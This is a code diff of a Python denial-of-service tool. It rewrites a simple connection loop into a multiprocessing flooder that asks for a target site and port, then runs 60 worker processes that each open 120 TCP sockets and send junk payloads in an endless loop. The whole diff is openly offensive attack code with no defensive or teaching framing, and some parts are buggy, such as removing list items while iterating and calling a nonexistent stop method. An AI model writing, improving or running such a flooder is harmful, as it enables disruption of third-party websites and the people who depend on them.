@@ -1,62 +1,87 @@
+from helpers import get_random_url
+import json
 import socket
-import os
-import sys
+import multiprocessing
 
 
-def restart_program():
-    # Retrieves the path to the Python interpreter currently running this script
-    python = sys.executable
-    # Replaces the current process with a new instance of Python with the same script
-    os.execl(python, python, * sys.argv)
-
-
-def dos(host, ip):
-    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    message = "Hello World"
-    port = 80
-
-    # Add try except block to handle errors
+def attack_worker(ip_address, port, number_of_sockets, ):
     try:
-        ddos.connect((host, port))
-        ddos.send(message.encode())
-        ddos.sendto(message.encode(), (ip, port))
-    except socket.error as msg:
-        # Handling connection errors if they occur
-        print("|     [Connection Failed]    |")
-        print("|    [DDoS Attack Engaged]    |")
+        sockets = []
+        for i in range(number_of_sockets):
+            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ddos.connect((ip_address, port))
+            sockets.append(ddos)
 
-    # Closing the socket
-    ddos.close()
+        for ddos in sockets:
+            random_url = get_random_url()
+            message = json.dumps(random_url).encode()
+            ddos.send(message)
+            ddos.sendto(message, (ip_address, port))
+            ddos.send(message)
+
+        for conn_close in sockets:
+            try:
+                conn_close.close()
+            except:
+                pass
+    except Exception as err:
+        print(err)
+
+
+def monitor(workers):
+    while len(workers) > 10:
+        try:
+            for worker in workers:
+                if worker is not None and worker.is_alive():
+                    worker.join(1.0)
+
+                    print(f"Woker Number - {worker.name} Joined!")
+                else:
+                    # Removing dead workers from workers list
+                    workers.remove(worker)
+        except (KeyboardInterrupt, SystemExit):
+            print("CTRL+C received. Killing all workers")
+            for worker in workers:
+                try:
+                    print(f"Killing worker {worker.name}")
+                    worker.stop()
+                except Exception:
+                    pass  # silently ignore
 
 
 def main():
-    print("DDoS Mode Loaded")
-
-    # Take host name and number of connections from the user
     host = input("Site you want to DDoS:")
-    conn = int(input("How many connections you want to make:"))
+    port = int(input("Enter port number:"))
 
-    ip = socket.gethostbyname(host)
-    print("[" + ip + "]")
-    print("[ Ip is locked ]")
-    print("[ Attacking " + host + " ]")
+    ip_address = socket.gethostbyname(host)
 
-    print("+----------------------------+")
+    # Default number of sockets
+    number_of_sockets = 120
 
-    # Write for loop to send multiple dos request on server
-    for i in range(1, conn):
-        dos(host, ip)
+    # Defalut number of workers
+    number_of_workers = 60
+    print("|| DDoS Loaded ||")
 
-    print("+----------------------------+")
-    # Notify the user after requsted connections are finished
-    print("The connections you requested had finished")
+    print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(
+        "GET", number_of_workers, number_of_sockets))
+
+    # SA3.2
+    while True:
+        try:
+            workers = []
+            for i in range(number_of_workers):
+                # Define the number of workers here
+                worker = multiprocessing.Process(
+                    target=attack_worker, args=(ip_address, port, number_of_sockets))
+                workers.append(worker)
+
+                worker.start()
+
+            monitor(workers)
+
+        except Exception as err:
+            print("| Connection Failed |")
 
 
-main()
-
-# Handle restart program
-answer = input("Do you want to ddos more?")
-if answer.strip() in "y Y yes Yes YES".split():
-    restart_program()
-else:
-    exit()
+if __name__ == "__main__":
+    main()
